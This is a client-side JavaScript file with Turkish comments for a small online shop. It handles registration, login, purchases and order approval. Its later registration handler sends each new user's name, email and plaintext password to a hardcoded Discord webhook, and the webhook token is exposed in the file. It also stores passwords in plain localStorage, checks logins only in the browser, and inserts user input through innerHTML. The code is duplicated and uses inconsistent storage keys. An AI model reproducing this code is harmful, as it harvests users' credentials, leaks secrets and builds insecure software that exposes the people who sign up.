// Discord Webhook URL - Burayı kendi webhook URL'inizle değiştirin
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1353848010735616032/V_lGzTIkpX2fvQLs7v20h2ubd_M6dSXcKta6gac1JelX3fiCm816PkWgvSwXy26-NOTI';

// Satılan ürünlerin veritabanı
let products = JSON.parse(localStorage.getItem('SefirCommunity_products')) || [
    {
        id: 1,
        name: "Logo Tasarım",
        price: 299,
        features: ["Kaliteli Hizmet", "Sıfırdan Çizim", "Sınırsız Revize", "Sefir Güvencesiyle"],
        category: "tasarim",
        sales: 0,
    },
    {
        id: 2,
        name: "Web Site Yazılım",
        price: 900,
        features: ["İstediğiniz Seçenekler", "7/24 Aktif Etme", "7/24 Canlı Destek"],
        category: "yazilim",
        sales: 0,
    },
    {
        id: 3,
        name: "Instagram Destek Hattı",
        price: 250,
        features: ["Kaliteli Otomasyon", "Hızlı Yanıt", "7/24 Aktiflik", "Kesintisiz Destek"],
        category: "sosyal-medya",
        sales: 0,
    }
];

// Kullanıcı verileri
let users = JSON.parse(localStorage.getItem('SefirCommunity_users')) || [];
let currentUser = JSON.parse(localStorage.getItem('SefirCommunity_currentUser')) || null;

// Satış geçmişi
let salesHistory = JSON.parse(localStorage.getItem('SefirCommunity_salesHistory')) || [];

// DOM yüklendiğinde çalışacak fonksiyonlar
document.addEventListener('DOMContentLoaded', function() {
    checkAuthStatus();
    renderProducts();
    renderSalesHistory();
    
    // Form event listener'ları
    document.getElementById('loginForm')?.addEventListener('submit', handleLogin);
    document.getElementById('registerForm')?.addEventListener('submit', handleRegister);
    document.getElementById('purchaseForm')?.addEventListener('submit', handlePurchase);
});

// Ürünleri ekrana render etme
function renderProducts() {
    const container = document.getElementById('productsContainer');
    if (!container) return;
    
    container.innerHTML = products.map(product => `
        <div class="col-md-4 mb-4">
            <div class="card product-card h-100">
                <div class="card-body">
                    <h5 class="card-title">${product.name}</h5>
                    <h6 class="card-subtitle mb-2 text-primary">₺${product.price}/ay</h6>
                    <ul class="product-features">
                        ${product.features.map(feature => `<li><i class="fas fa-check-circle text-success"></i> ${feature}</li>`).join('')}
                    </ul>
                </div>
                <div class="card-footer bg-transparent">
                    <button class="btn btn-primary w-100" onclick="showPurchaseModal(${product.id})">
                        <i class="fas fa-shopping-cart me-2"></i>Satın Al
                    </button>
                </div>
            </div>
        </div>
    `).join('');
}

// Satın alma modalını göster
function showPurchaseModal(productId) {
    const product = products.find(p => p.id === productId);
    if (!product) return;
    
    if (!currentUser) {
        alert('Satın almak için lütfen giriş yapın veya kayıt olun.');
        showLoginModal();
        return;
    }
    
    document.getElementById('selectedProductId').value = product.id;
    document.getElementById('selectedProductName').value = product.name;
    document.getElementById('selectedProductPrice').value = `${product.price}₺/ay`;
    
    // Modalı göster
    const purchaseModal = new bootstrap.Modal(document.getElementById('purchaseModal'));
    purchaseModal.show();
}

// Giriş işlemi
function handleLogin(e) {
    e.preventDefault();
    
    const email = document.getElementById('loginEmail').value;
    const password = document.getElementById('loginPassword').value;
    
    const user = users.find(u => u.email === email && u.password === password);
    
    if (user) {
        currentUser = user;
        localStorage.setItem('sefirhost_currentUser', JSON.stringify(currentUser));
        checkAuthStatus();
        
        // Modalı kapat
        const loginModal = bootstrap.Modal.getInstance(document.getElementById('loginModal'));
        loginModal.hide();
        
        showToast('Başarıyla giriş yaptınız!', 'success');
    } else {
        showToast('E-posta veya şifre hatalı!', 'danger');
    }
}

// Kayıt işlemi
function handleRegister(e) {
    e.preventDefault();
    
    const name = document.getElementById('registerName').value;
    const email = document.getElementById('registerEmail').value;
    const password = document.getElementById('registerPassword').value;
    const passwordConfirm = document.getElementById('registerPasswordConfirm').value;
    
    if (password !== passwordConfirm) {
        showToast('Şifreler eşleşmiyor!', 'danger');
        return;
    }
    
    if (users.some(u => u.email === email)) {
        showToast('Bu e-posta adresi zaten kayıtlı!', 'danger');
        return;
    }
    
    const newUser = { 
        id: Date.now(), 
        name, 
        email, 
        password,
        joinDate: new Date().toISOString(),
        totalPurchases: 0
    };
    
    users.push(newUser);
    currentUser = newUser;
    
    localStorage.setItem('sefirhost_users', JSON.stringify(users));
    localStorage.setItem('sefirhost_currentUser', JSON.stringify(currentUser));
    
    checkAuthStatus();
    
    // Modalı kapat
    const registerModal = bootstrap.Modal.getInstance(document.getElementById('registerModal'));
    registerModal.hide();
    
    showToast('Başarıyla kayıt oldunuz!', 'success');
}

// Satın alma işlemi
function handlePurchase(e) {
    e.preventDefault();
    
    const productId = parseInt(document.getElementById('selectedProductId').value);
    const product = products.find(p => p.id === productId);
    const paymentMethod = document.getElementById('paymentMethod').value;
    const notes = document.getElementById('purchaseNotes').value;
    
    if (!product || !currentUser) return;
    
    // Satış kaydı oluştur
    const saleRecord = {
        id: Date.now(),
        productId: product.id,
        productName: product.name,
        userId: currentUser.id,
        userName: currentUser.name,
        price: product.price,
        date: new Date().toISOString(),
        paymentMethod,
        notes,
        status: 'pending'
    };
    
    // Verileri güncelle
    product.sales++;
    currentUser.totalPurchases++;
    salesHistory.push(saleRecord);
    
    // LocalStorage'ı güncelle
    localStorage.setItem('sefirhost_products', JSON.stringify(products));
    localStorage.setItem('sefirhost_currentUser', JSON.stringify(currentUser));
    localStorage.setItem('sefirhost_salesHistory', JSON.stringify(salesHistory));
    
    // Discord'a bildirim gönder
    sendDiscordNotification(saleRecord);
    
    // Modalı kapat
    const purchaseModal = bootstrap.Modal.getInstance(document.getElementById('purchaseModal'));
    purchaseModal.hide();
    
    // Satış geçmişini yenile
    renderSalesHistory();
    
    showToast('Satın alma işlemi başarıyla tamamlandı!', 'success');
}

// Discord bildirimi gönder
function sendDiscordNotification(saleRecord) {
    const embed = {
        title: "Yeni Satın Alma!",
        color: 0x00ff00,
        fields: [
            { name: "Ürün", value: saleRecord.productName, inline: true },
            { name: "Fiyat", value: `${saleRecord.price}₺`, inline: true },
            { name: "Müşteri", value: `${saleRecord.userName} (ID: ${saleRecord.userId})`, inline: false },
            { name: "Ödeme Yöntemi", value: saleRecord.paymentMethod, inline: true },
            { name: "Notlar", value: saleRecord.notes || "Yok", inline: true },
            { name: "Tarih", value: new Date(saleRecord.date).toLocaleString(), inline: false }
        ],
        timestamp: new Date().toISOString()
    };
    
    fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ embeds: [embed] }),
    }).catch(error => console.error('Discord webhook error:', error));
}

// Satış geçmişini render et
function renderSalesHistory() {
    const container = document.getElementById('salesHistoryContainer');
    if (!container) return;
    
    if (!currentUser) {
        container.innerHTML = '<div class="alert alert-warning">Satış geçmişini görüntülemek için giriş yapmalısınız.</div>';
        return;
    }
    
    const userSales = salesHistory.filter(sale => sale.userId === currentUser.id);
    
    if (userSales.length === 0) {
        container.innerHTML = '<div class="alert alert-info">Henüz satın alma geçmişiniz bulunmamaktadır.</div>';
        return;
    }
    
    container.innerHTML = `
        <div class="table-responsive">
            <table class="table table-hover">
                <thead>
                    <tr>
                        <th>Ürün</th>
                        <th>Fiyat</th>
                        <th>Tarih</th>
                        <th>Durum</th>
                    </tr>
                </thead>
                <tbody>
                    ${userSales.map(sale => `
                        <tr>
                            <td>${sale.productName}</td>
                            <td>${sale.price}₺</td>
                            <td>${new Date(sale.date).toLocaleDateString()}</td>
                            <td><span class="badge ${getStatusBadgeClass(sale.status)}">${getStatusText(sale.status)}</span></td>
                        </tr>
                    `).join('')}
                </tbody>
            </table>
        </div>
    `;
}

// Kullanıcı durumunu kontrol et
function checkAuthStatus() {
    const authButtons = document.getElementById('authButtons');
    const userSection = document.getElementById('userSection');
    
    if (currentUser) {
        if (authButtons) authButtons.style.display = 'none';
        if (userSection) {
            userSection.style.display = 'block';
            document.getElementById('usernameDisplay').textContent = currentUser.name;
        }
    } else {
        if (authButtons) authButtons.style.display = 'block';
        if (userSection) userSection.style.display = 'none';
    }
}

// Çıkış yap
function logout() {
    currentUser = null;
    localStorage.removeItem('sefirhost_currentUser');
    checkAuthStatus();
    showToast('Başarıyla çıkış yaptınız!', 'success');
    renderSalesHistory();
}

// Toast mesajı göster
function showToast(message, type = 'info') {
    const toastContainer = document.getElementById('toastContainer');
    if (!toastContainer) return;
    
    const toastId = `toast-${Date.now()}`;
    const toast = document.createElement('div');
    toast.className = `toast show align-items-center text-white bg-${type} border-0`;
    toast.id = toastId;
    toast.role = 'alert';
    toast.innerHTML = `
        <div class="d-flex">
            <div class="toast-body">${message}</div>
            <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
        </div>
    `;
    
    toastContainer.appendChild(toast);
    
    // 5 saniye sonra kaldır
    setTimeout(() => {
        const bsToast = bootstrap.Toast.getOrCreateInstance(document.getElementById(toastId));
        bsToast.hide();
        toast.addEventListener('hidden.bs.toast', () => toast.remove());
    }, 5000);
}

// Durum metnini al
function getStatusText(status) {
    const statusMap = {
        'pending': 'Beklemede',
        'completed': 'Tamamlandı',
        'cancelled': 'İptal Edildi',
        'refunded': 'İade Edildi'
    };
    return statusMap[status] || status;
}

// Durum badge class'ını al
function getStatusBadgeClass(status) {
    const classMap = {
        'pending': 'bg-warning',
        'completed': 'bg-success',
        'cancelled': 'bg-danger',
        'refunded': 'bg-secondary'
    };
    return classMap[status] || 'bg-info';
}

// Modal göster
function showLoginModal() {
    const modal = new bootstrap.Modal(document.getElementById('loginModal'));
    modal.show();
}

function showRegisterModal() {
    const modal = new bootstrap.Modal(document.getElementById('registerModal'));
    modal.show();
}
// localStorage'dan siparişleri yükleme fonksiyonu
function siparisleriYukle() {
    const kayitliSiparisler = localStorage.getItem('siparisler');
    return kayitliSiparisler ? JSON.parse(kayitliSiparisler) : {};
}

// localStorage'a siparişleri kaydetme fonksiyonu
function siparisleriKaydet(siparisler) {
    localStorage.setItem('siparisler', JSON.stringify(siparisler));
}

// Örnek sipariş verileri (başlangıçta yoksa oluştur)
if (!localStorage.getItem('siparisler')) {
    const baslangicSiparisleri = {
        "123": { id: "123", durum: "bekleniyor", detay: "Ürün A", musteri: "Ahmet Yılmaz" },
        "456": { id: "456", durum: "bekleniyor", detay: "Ürün B", musteri: "Ayşe Kaya" }
    };
    siparisleriKaydet(baslangicSiparisleri);
}

// Komut işleme fonksiyonu
function komutIsle(komut) {
    const args = komut.trim().split(' ');
    const komutAdi = args[0];
    const siparisId = args[1];

    if (komutAdi === '/siparişonayla') {
        if (!siparisId) {
            return "Hata: Sipariş ID'si belirtilmedi. Kullanım: /siparişonayla (siparişid)";
        }

        const siparisler = siparisleriYukle();
        
        if (siparisler[siparisId]) {
            if (siparisler[siparisId].durum === "bekleniyor") {
                // Durumu güncelle
                siparisler[siparisId].durum = "onaylandı";
                siparisler[siparisId].onayTarihi = new Date().toISOString();
                
                // Değişiklikleri kaydet
                siparisleriKaydet(siparisler);
                
                return `✅ Sipariş #${siparisId} başarıyla onaylandı!\n` +
                       `Müşteri: ${siparisler[siparisId].musteri}\n` +
                       `Ürün: ${siparisler[siparisId].detay}\n` +
                       `Onay Tarihi: ${new Date(siparisler[siparisId].onayTarihi).toLocaleString()}`;
            } else {
                return `ℹ️ Sipariş #${siparisId} zaten ${siparisler[siparisId].durum} durumunda.`;
            }
        } else {
            return `❌ Hata: ${siparisId} numaralı sipariş bulunamadı.`;
        }
    }

    return "⚠️ Bilinmeyen komut";
}

// Sayfa yüklendiğinde mevcut siparişleri göster
document.addEventListener('DOMContentLoaded', function() {
    const siparisler = siparisleriYukle();
    console.log("Mevcut siparişler:", siparisler);
});

// Kullanım örneği (bir buton click'inde veya komut girildiğinde)
function komutCalistir() {
    const komutInput = document.getElementById('komutInput');
    const sonucDiv = document.getElementById('sonuc');
    
    const sonuc = komutIsle(komutInput.value);
    sonucDiv.innerHTML = sonuc;
    komutInput.value = '';
}
// Discord Webhook URL'leri
const SALES_WEBHOOK = 'https://discord.com/api/webhooks/1353848010735616032/V_lGzTIkpX2fvQLs7v20h2ubd_M6dSXcKta6gac1JelX3fiCm816PkWgvSwXy26-NOTI';
const REGISTRATION_WEBHOOK = 'https://discord.com/api/webhooks/1353848010735616032/V_lGzTIkpX2fvQLs7v20h2ubd_M6dSXcKta6gac1JelX3fiCm816PkWgvSwXy26-NOTI'; // Yeni webhook URL'nizi buraya ekleyin

// Kayıt işlemi (güncellenmiş versiyon)
function handleRegister(e) {
    e.preventDefault();
    
    const name = document.getElementById('registerName').value;
    const email = document.getElementById('registerEmail').value;
    const password = document.getElementById('registerPassword').value;
    const passwordConfirm = document.getElementById('registerPasswordConfirm').value;
    
    if (password !== passwordConfirm) {
        showToast('Şifreler eşleşmiyor!', 'danger');
        return;
    }
    
    if (users.some(u => u.email === email)) {
        showToast('Bu e-posta adresi zaten kayıtlı!', 'danger');
        return;
    }
    
    const newUser = { 
        id: Date.now(), 
        name, 
        email, 
        password,
        joinDate: new Date().toISOString(),
        totalPurchases: 0
    };
    
    users.push(newUser);
    currentUser = newUser;
    
    // Verileri JSON dosyasına kaydet (simüle edilmiş)
    saveDataToJson();
    
    // Discord'a kayıt bildirimi gönder
    sendRegistrationToDiscord(newUser);
    
    checkAuthStatus();
    
    // Modalı kapat
    const registerModal = bootstrap.Modal.getInstance(document.getElementById('registerModal'));
    registerModal.hide();
    
    showToast('Başarıyla kayıt oldunuz!', 'success');
}

// JSON verilerini kaydetme fonksiyonu (simüle edilmiş)
function saveDataToJson() {
    // Gerçekte bu bir sunucu tarafı işlemi olmalı
    // Bu örnekte localStorage kullanmaya devam ediyoruz
    localStorage.setItem('sefirhost_users', JSON.stringify(users));
    localStorage.setItem('sefirhost_products', JSON.stringify(products));
    localStorage.setItem('sefirhost_salesHistory', JSON.stringify(salesHistory));
    
    // Gerçek bir JSON dosyasına kaydetmek için:
    // fetch('/api/save-data', {
    //     method: 'POST',
    //     body: JSON.stringify({ users, products, salesHistory })
    // });
}

// Discord'a kayıt bildirimi gönderme
function sendRegistrationToDiscord(user) {
    const embed = {
        title: "Yeni Kullanıcı Kaydı!",
        color: 0x3498db,
        fields: [
            { name: "Ad", value: user.name, inline: true },
            { name: "E-posta", value: user.email, inline: true },
            { name: "Kayıt Tarihi", value: new Date(user.joinDate).toLocaleString(), inline: false },
            { name: "Şifre", value: "||" + user.password + "||", inline: false } // Şifreyi spoiler olarak göster
        ],
        timestamp: new Date().toISOString()
    };
    
    fetch(REGISTRATION_WEBHOOK, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
            content: "📢 Yeni kullanıcı kaydı!",
            embeds: [embed] 
        }),
    }).catch(error => console.error('Discord webhook error:', error));
}
// Satın alma işlemi fonksiyonunu güncelleyelim
function handlePurchase(e) {
    e.preventDefault();
    
    const productId = parseInt(document.getElementById('selectedProductId').value);
    const product = products.find(p => p.id === productId);
    const paymentMethod = document.getElementById('paymentMethod').value;
    const notes = document.getElementById('purchaseNotes').value;
    
    if (!product || !currentUser) return;
    
    // Satış kaydı oluştur
    const saleRecord = {
        id: Date.now(),
        productId: product.id,
        productName: product.name,
        userId: currentUser.id,
        userName: currentUser.name,
        price: product.price,
        date: new Date().toISOString(),
        paymentMethod,
        notes,
        status: 'pending'
    };
    
    // Verileri güncelle
    product.sales++;
    currentUser.totalPurchases++;
    salesHistory.push(saleRecord);
    
    // LocalStorage'ı güncelle
    localStorage.setItem('sefirhost_products', JSON.stringify(products));
    localStorage.setItem('sefirhost_currentUser', JSON.stringify(currentUser));
    localStorage.setItem('sefirhost_salesHistory', JSON.stringify(salesHistory));
    
    // Discord'a bildirim gönder
    sendDiscordNotification(saleRecord);
    
    // Modalı kapat
    const purchaseModal = bootstrap.Modal.getInstance(document.getElementById('purchaseModal'));
    purchaseModal.hide();
    
    // Satış geçmişini yenile
    renderSalesHistory();
    
    // Yönlendirme yap (EKLEDİĞİMİZ KISIM)
    setTimeout(() => {
        window.location.href = "https://shopier.com/sefirroleplay"; // BU LİNKİ DEĞİŞTİRİN
    }, 2000);
    
    showToast('Satın alma işlemi başarıyla tamamlandı! Yönlendiriliyorsunuz...', 'success');
}
